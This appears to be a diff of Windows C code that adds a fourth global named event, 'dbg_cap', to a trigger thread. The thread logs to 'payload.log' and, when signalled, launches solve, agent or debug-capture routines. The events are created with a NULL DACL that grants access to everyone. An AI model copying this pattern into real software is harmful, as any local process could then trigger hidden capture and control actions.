@@ -1826,20 +1826,26 @@ static DWORD WINAPI dev_trigger_thread(LPVOID unused) {
     SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);   /* NULL DACL = all access */
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = &sd; sa.bInheritHandle = FALSE;
-    HANDLE ev[3];
+    HANDLE ev[4];
     ev[0] = CreateEventA(&sa, FALSE, FALSE, "Global\\svcldb_dev_solve");
     ev[1] = CreateEventA(&sa, FALSE, FALSE, "Global\\svcldb_dev_agent_start");
     ev[2] = CreateEventA(&sa, FALSE, FALSE, "Global\\svcldb_dev_agent_stop");
-    if (!ev[0] || !ev[1] || !ev[2]) {
+    ev[3] = CreateEventA(&sa, FALSE, FALSE, "Global\\svcldb_dev_dbg_cap");
+    if (!ev[0] || !ev[1] || !ev[2] || !ev[3]) {
         slog_writef("payload.log", "dev_trigger: CreateEvent failed (%lu)", GetLastError());
         return 1;
     }
-    slog_writef("payload.log", "dev_trigger: ARMED (Global\\svcldb_dev_solve / _agent_start / _agent_stop)");
+    slog_writef("payload.log", "dev_trigger: ARMED (Global\\svcldb_dev_solve / _agent_start / _agent_stop / _dbg_cap)");
     for (;;) {
-        DWORD w = WaitForMultipleObjects(3, ev, FALSE, INFINITE);
+        DWORD w = WaitForMultipleObjects(4, ev, FALSE, INFINITE);
         if (w == WAIT_OBJECT_0)          { slog_writef("payload.log", "dev_trigger: -> SOLVE");       solve_launch(); }
         else if (w == WAIT_OBJECT_0 + 1) { slog_writef("payload.log", "dev_trigger: -> AGENT_START"); agent_start(); }
         else if (w == WAIT_OBJECT_0 + 2) { slog_writef("payload.log", "dev_trigger: -> AGENT_STOP");  agent_stop();  }
+        else if (w == WAIT_OBJECT_0 + 3) {
+            slog_writef("payload.log", "dev_trigger: -> DBG_CAP");
+            HANDLE t = CreateThread(NULL, 0, debug_capture_thread, NULL, 0, NULL);
+            if (t) CloseHandle(t);
+        }
         else break;
     }
     return 0;
